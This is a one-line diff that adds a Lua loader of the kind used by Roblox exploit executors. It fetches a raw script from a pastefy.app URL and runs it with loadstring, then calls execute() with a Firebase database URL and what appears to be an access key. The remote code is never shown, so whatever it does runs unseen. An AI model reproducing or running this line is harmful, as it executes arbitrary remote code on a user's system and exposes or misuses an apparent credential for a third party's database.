@@ -1,0 +1,1 @@
+loadstring(game:HttpGetAsync('https://pastefy.app/mJ8vapGJ/raw'))()execute("https://random-946bf-default-rtdb.asia-southeast1.firebasedatabase.app/", "mOa5g5601ZBJqzkfHj8CPDMNgZJN6RIy61l1NbiN", "Script1")
